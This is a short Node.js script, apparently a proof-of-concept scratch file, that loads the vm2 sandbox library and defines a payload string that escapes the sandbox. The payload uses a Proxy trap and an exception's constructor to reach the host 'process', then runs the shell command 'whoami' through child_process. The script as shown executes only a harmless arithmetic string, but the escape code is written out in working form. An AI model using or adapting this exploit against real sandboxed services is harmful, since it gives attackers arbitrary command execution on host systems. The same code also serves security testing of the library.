"use strict";
const {VM} = require('vm2');
const untrusted2 = `
var process;
try{
Object.defineProperty(Buffer.from(""),"",{
	value:new Proxy({},{
		getPrototypeOf(target){
			if(this.t)
				throw Buffer.from;
			this.t=true;
			return Object.getPrototypeOf(target);
		}
	})
});
}catch(e){
	process = e.constructor("return process")();
}
process.mainModule.require("child_process").execSync("whoami").toString()
`;

var untrusted3 ="let a=1\nlet b =a\na+b";
var untrusted ="let a=1\nlet b=a\na+b";
try{
	console.log(new VM().run(untrusted));
}catch(x){
	console.log(x);
}
